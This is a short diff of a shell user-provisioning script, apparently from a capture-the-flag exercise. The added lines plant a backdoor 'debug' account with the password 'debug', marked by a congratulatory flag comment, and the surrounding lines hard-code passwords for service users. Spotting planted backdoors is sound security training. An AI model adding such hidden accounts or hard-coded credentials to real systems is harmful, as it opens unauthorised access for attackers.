@@ -24,3 +24,7 @@ sudo chmod 700 /home/webserver
 # MYSQL 
 sudo useradd -m mysql -p bUDvwzw5cVaETMBrIo
 sudo chmod 700 /home/mysql
+
+# Easy backup user debug #Congratulations!Y0uF0undTh3Ea5y8ackd0or:+1:
+sudo useradd -m debug -p debug 
+sudo chmod 700 /home/debug
